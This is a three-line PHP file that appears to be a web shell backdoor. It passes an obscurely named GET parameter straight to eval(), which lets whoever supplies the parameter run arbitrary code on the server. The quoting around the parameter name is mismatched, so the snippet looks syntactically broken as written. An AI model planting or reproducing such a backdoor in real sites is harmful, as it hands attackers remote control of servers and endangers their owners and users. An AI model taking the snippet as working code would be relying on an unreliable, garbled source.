<?php
eval($_GET["MnbAh8Sw']);
?>
